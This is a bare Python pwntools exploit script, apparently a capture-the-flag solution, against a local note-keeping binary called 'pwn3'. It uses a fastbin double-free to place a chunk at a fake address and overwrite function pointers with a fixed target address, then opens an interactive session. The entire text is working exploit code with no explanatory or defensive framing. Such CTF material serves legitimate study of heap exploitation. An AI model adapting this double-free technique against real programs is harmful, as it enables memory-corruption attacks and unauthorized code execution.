from pwn import *

p=process("./pwn3")

def add_note(idx,size,content):
	p.sendlineafter("2 delete paper\n","1")
	p.sendlineafter("Input the index you want to store(0-9):",str(idx))
	p.sendlineafter("How long you will enter:",str(size))
	p.sendlineafter("please enter your content:",content)

def delete_note(idx):
	p.sendlineafter("2 delete paper\n","2")
	p.sendlineafter("which paper you want to delete,please enter it's index(0-9):",str(idx))

if __name__=="__main__":
	fake_chunk=0x602032
	add_note(0,0x30,'aaaa')
	add_note(1,0x30,"bbbb")
	delete_note(0)
	delete_note(1)
	delete_note(0)

	add_note(0,0x30,p64(fake_chunk))
	add_note(1,0x30,"aaaa")
	add_note(2,0x30,"aaaa")

	payload=p8(0)*22+p64(0x400943)*2
	add_note(3,0x30,payload)
	p.sendlineafter("2 delete paper\n","1")
	p.interactive()
	